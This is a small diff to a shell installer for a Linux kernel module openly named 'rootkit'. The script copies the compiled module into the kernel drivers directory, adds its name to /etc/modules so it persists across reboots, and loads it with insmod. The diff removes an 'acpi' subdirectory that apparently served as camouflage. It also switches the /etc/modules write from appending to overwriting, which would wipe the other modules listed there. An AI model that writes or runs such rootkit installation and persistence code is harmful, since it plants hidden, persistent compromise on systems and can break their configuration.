@@ -2,9 +2,8 @@
 
 MODULE_NAME="rootkit"
 PROCFILE_NAME="rootkit"
-DRIVER="acpi"
 KERNEL_VERSION=$(uname -r)
-DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/rk_file_$MODULE_NAME"
+DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/rk_file_$MODULE_NAME"
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
 
 function install_rk() {
@@ -20,7 +19,7 @@ function install_rk() {
     fi
 
     cp "$PWD/build/rootkit.ko" "$DRIVER_DIRECTORY"
-    echo "$MODULE_NAME" >>/etc/modules
+    echo "$MODULE_NAME" >/etc/modules
     insmod "$DRIVER_DIRECTORY/$MODULE_NAME.ko"
     depmod
 }
